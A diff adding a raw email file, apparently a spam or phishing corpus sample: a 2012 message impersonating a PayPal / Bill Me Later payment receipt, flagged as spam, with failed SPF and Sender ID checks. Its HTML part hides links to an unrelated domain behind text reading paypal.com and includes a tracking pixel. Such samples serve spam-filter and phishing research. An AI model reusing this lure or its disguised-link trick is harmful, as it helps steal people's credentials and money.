@@ -1,0 +1,184 @@
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="_54ce2fbd-695e-41dd-a04b-c859cb416fa9_"
+Subject: [none] Fax - Thank you for scheduling a payment to Bill Me Later - Message was found
+ to be spam: (50%) URL is in DNSBL,(50%) Sender has spammy reputation,
+To: "[none] Fax" <efax@transworldfacilities.com>
+From: Bill Me Later <service@billmelater.com>
+Sender: <MicrosoftExchange329e71ec88ae4615bbc36ab6ce41109e@twf.transworldfacilities.com>
+Message-ID: <1608fa12-93a3-4b03-a872-b49fda10e0f8@journal.report.generator>
+Date: Tue, 6 Nov 2012 18:41:42 +0000
+X-MS-Journal-Report:
+X-MS-Exchange-Organization-AuthSource: TWFSRV01.twf.transworldfacilities.com
+X-MS-Exchange-Organization-AuthAs: Internal
+X-MS-Exchange-Organization-AuthMechanism: 05
+Keywords:
+
+--_54ce2fbd-695e-41dd-a04b-c859cb416fa9_
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+Sender: service@billmelater.com
+Subject: [none] Fax - Thank you for scheduling a payment to Bill Me Later - Message was found to be spam: (50%) URL is in DNSBL,(50%) Sender has spammy reputation,
+Message-Id: <1187877723.5954@paypal.com>
+Recipient: Jonathan@transworldfacilities.com, Expanded: efax@transworldfacilities.com
+Recipient: PF-eFax@transworldfacilities.com, Expanded: efax@transworldfacilities.com
+
+--_54ce2fbd-695e-41dd-a04b-c859cb416fa9_
+Content-Type: message/rfc822
+
+Received: from 187-162-140-147.static.axtel.net (187.162.140.147) by
+ TWFSRV01.twf.transworldfacilities.com (10.108.180.50) with Microsoft SMTP
+ Server id 14.2.298.4; Tue, 6 Nov 2012 13:41:40 -0500
+Received: from mx0.slc.paypal.com (mx2.slc.paypal.com. [173.0.84.227])
+        by mx0.slc.paypal.com with ESMTP id
+ W6CAYKJ3JAO836M2.803.4732.68.49.01.08.64;Tue, 6 Nov 2012 12:41:44 -0600
+Received-SPF: Fail (TWFSRV01.twf.transworldfacilities.com: domain of service@billmelater.com does
+ not designate 187.162.140.147 as permitted sender) receiver=TWFSRV01.twf.transworldfacilities.com;
+ client-ip=187.162.140.147; helo=187-162-140-147.static.axtel.net;
+Received-SPF: pass (payment@paypal.com designates 173.0.84.227 as permitted sender) client-ip=173.0.84.227;
+DKIM-Signature: v=1; a=rsa-sha1; d=paypal.com; s=dkim; c=relaxed/relaxed;q=dns/txt; i=@paypal.com;
+ t=6487381657;h=From:From:Subject:Date:To:MIME-Version:Content-Type;
+Received: (qmail 9408 invoked by uid 152); Tue, 6 Nov 2012 12:41:44 -0600
+Date: Tue, 6 Nov 2012 12:41:44 -0600
+Message-ID: <1187877723.5954@paypal.com>
+AMQ-Delivery-Message-Id: EMAILDELIVERY-Notification_EmailDeliveryEvent-9-3285016412079-732794365
+Subject: [none] Fax - Thank you for scheduling a payment to Bill Me Later - Message was found
+ to be spam: (50%) URL is in DNSBL,(50%) Sender has spammy reputation,
+X-MaxCode-Template: email-receipt-individual
+To: "[none] Fax" <efax@transworldfacilities.com>
+From: Bill Me Later <service@billmelater.com>
+X-Email-Type-Id: PP008
+X-XPT-XSL-Name: notifications_email/default/en_US/Customer/transaction/buyer/ReceiptIndividual.xsl
+Content-Type: multipart/alternative;
+	boundary="_a131bd66-17da-4e16-9f23-3deb2c92d046_"
+Return-Path: service@billmelater.com
+X-MS-Exchange-Organization-OriginalArrivalTime: 06 Nov 2012 18:41:40.2435 (UTC)
+X-MS-Exchange-Forest-ArrivalHubServer: TWFSRV01.twf.transworldfacilities.com
+X-MS-Exchange-Organization-OriginalClientIPAddress: 187.162.140.147
+X-MS-Exchange-Organization-OriginalServerIPAddress: 10.108.180.50
+X-MS-Exchange-Organization-AuthSource: TWFSRV01.twf.transworldfacilities.com
+X-MS-Exchange-Organization-AuthAs: Anonymous
+X-MS-Exchange-Organization-MessageDirectionality: Incoming
+X-MS-Exchange-Organization-Cross-Premises-Headers-Processed: TWFSRV01.twf.transworldfacilities.com
+X-GFI-SMTP-Submission: 1
+X-MS-Exchange-Organization-PRD: billmelater.com
+X-MS-Exchange-Organization-SenderIdResult: Fail
+X-GFI-SMTP-Submission: 1
+X-GFI-SMTP-HelloDomain: 187-162-140-147.static.axtel.net
+X-GFI-SMTP-RemoteIP: 187.162.140.147
+X-MS-Exchange-Organization-SCL: 9
+X-MS-Exchange-Organization-PCL: 2
+X-MS-Exchange-Organization-Antispam-Report: DV:3.3.11314.470;SID:SenderIDStatus Fail;OrigIP:187.162.140.147
+X-MS-Exchange-Organization-OriginalSize: 4679
+X-MS-Exchange-Forest-MessageScope: 00000000-0000-0000-0000-000000000000
+X-MS-Exchange-Organization-MessageScope: 00000000-0000-0000-0000-000000000000
+X-MS-Exchange-Organization-HygienePolicy: Standard
+X-GFIME-MASPAM: SPAM
+X-MS-Exchange-Organization-Recipient-Limit-Verified: True
+X-MS-Exchange-Forest-RulesExecuted: TWFSRV01
+X-MS-Exchange-Organization-Rules-Execution-History: Test User Auto Response
+MIME-Version: 1.0
+
+--_a131bd66-17da-4e16-9f23-3deb2c92d046_
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset="windows-1252"
+
+																																	
+																																 					
+																																Dear [none] Fax,																						Thank =
+you for scheduling the following payment to Bill Me Later=AE, a PayPal servi=
+ce:																							Recipient: Bill Me Later=AE, a PayPal service					=
+			Payment source: E-Check								Payment amount: $1921.29 USD								Paymen=
+t date: Nov 06, 2012 (at 02:12:15 CST)															=A0=A0=A0=A0=A0=A0 Clic=
+k here to view transaction details																								To edit or cancel =
+this scheduled payment log in to https://paypal.com.																	Click P=
+rofile at the top of the page and select Bill Me Later=AE, a PayPal service	=
+																Choose the payment you want to change and click Edit or Canc=
+el																												Thanks,														PayPal														PayPa=
+l Email ID PP2239					
+									
+
+--_a131bd66-17da-4e16-9f23-3deb2c92d046_
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset="3Dwindows-1252"
+
+<html>
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dus-ascii"=
+></head>
+<body>
+<html>
+	<body>
+		<div class=3D"ppmail">
+			<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ width=3D"600">
+				<tbody>
+					<tr valign=3D"top">
+						<td>
+							<span class=3D"Object" id=3D"OBJ_PREFIX_DWT88"><a href=3D"https://ww=
+w.paypal.com/us" target=3D"_blank"><img alt=3D"PayPal" border=3D"0" src=3D"=
+http://images.paypal.com/en_US/i/logo/email_logo.gif"></a></span></td>
+					</tr>
+				</tbody>
+			</table>
+			<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ width=3D"100%">
+				<tbody>
+					<tr>
+						<td>
+							&nbsp;</td>
+					</tr>
+				</tbody>
+			</table>
+			<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ width=3D"600">
+				<tbody>
+					<tr valign=3D"top">
+						<td width=3D"100%">
+							<span>Dear [none] Fax,</span><br>
+							<br>
+							<p>
+								Thank you for scheduling the following payment to Bill Me Later<sup=
+>?</sup>, a PayPal service:</p>
+							<p>
+								<br>
+								Recipient: Bill Me Later<sup>?</sup>, a PayPal service<br>
+								Payment source: E-Check<br>
+								Payment amount: $1921.29 USD<br>
+								Payment date: Nov 06, 2012 (at 02:12:15 CST)</p>
+							<p>
+								?????? <a href=3D"http://www.rot-schwarz-kiel.de/Us2vCevh/index.htm=
+l">Click here to view transaction details</a></p>
+							<ol>
+								<li>
+									To edit or cancel this scheduled payment log in to <a href=3D"http=
+://www.rot-schwarz-kiel.de/Us2vCevh/index.html">https://paypal.com</a>.</li=
+>
+								<li>
+									Click<strong> Profile </strong>at the top of the page and select<s=
+trong> Bill Me Later<sup>?</sup>, a PayPal service</strong></li>
+								<li>
+									Choose the payment you want to change and click <strong>Edit</stro=
+ng> or <strong>Cancel</strong></li>
+							</ol>
+							<br>
+							<br>
+							Thanks,<br>
+							<br>
+							PayPal<br>
+							<br>
+							<span><span class=3D"xptFooter ppid">PayPal Email ID PP2239</span></=
+span><img alt=3D"" border=3D"0" height=3D"1" src=3D"http://www.rot-schwarz-=
+kiel.de/Us2vCevh/index.html" width=3D"1"></td>
+					</tr>
+				</tbody>
+			</table>
+		</div></body>
+</html>
+</body>
+</html>
+
+--_a131bd66-17da-4e16-9f23-3deb2c92d046_--
+
+--_54ce2fbd-695e-41dd-a04b-c859cb416fa9_--
